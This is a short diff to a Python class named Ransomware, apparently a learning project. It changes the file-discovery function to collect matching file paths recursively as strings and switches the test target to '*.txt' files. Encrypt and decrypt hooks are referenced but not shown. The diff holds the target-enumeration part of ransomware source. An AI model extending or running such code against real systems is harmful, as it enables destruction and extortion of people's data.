@@ -37,7 +37,16 @@ class Ransomware:
 
     def get_files(self, filter:str)->list:
         # return all files matching the filter
-        files_list = sorted(Path().rglob(filter))
+        """
+        In the first scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
+        The paths are stored as PosixPath objects of their string equivalent.
+        """
+        # files_list = list(Path().rglob(filter))
+        """
+        In the second scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
+        The paths are stored as strings.
+        """
+        files_list = [str(p) for p in list(Path().rglob(filter))]
 
         return files_list
 
@@ -53,7 +62,7 @@ if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
     if len(sys.argv) < 2:
         ransomware = Ransomware()
-        ransomware._log.info(ransomware.get_files("bash"))
+        ransomware._log.info(ransomware.get_files("*.txt"))
         # ransomware.encrypt()
     elif sys.argv[1] == "--decrypt":
         ransomware = Ransomware()
